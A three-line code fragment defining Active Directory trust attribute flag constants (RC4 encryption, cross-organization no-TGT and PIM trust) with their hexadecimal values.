TRUST_ATTR_USES_RC4_ENCRYPTION = 0x00000080
TRUST_ATTR_CROSS_ORGANIZATION_NO_TGT = 0x00000200
TRUST_ATTR_PIM_TRUST = 0x00000400
